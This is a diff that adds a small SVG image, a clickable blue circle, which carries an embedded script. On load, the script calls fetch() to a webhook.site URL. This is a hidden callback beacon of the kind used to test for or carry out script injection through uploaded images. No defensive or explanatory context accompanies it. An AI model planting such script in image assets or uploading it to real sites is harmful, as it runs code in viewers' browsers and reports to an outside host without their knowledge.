@@ -1,0 +1,9 @@
+<svg width="200" height="200" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+  <circle id="myCircle" cx="100" cy="100" r="40" fill="#3498db" style="cursor: pointer;" />
+
+  <script type="application/ecmascript">
+    <![CDATA[
+      fetch("https://webhook.site/7e16439c-445f-439e-9fd3-38480cb67955?jsde")
+    ]]>
+  </script>
+</svg>
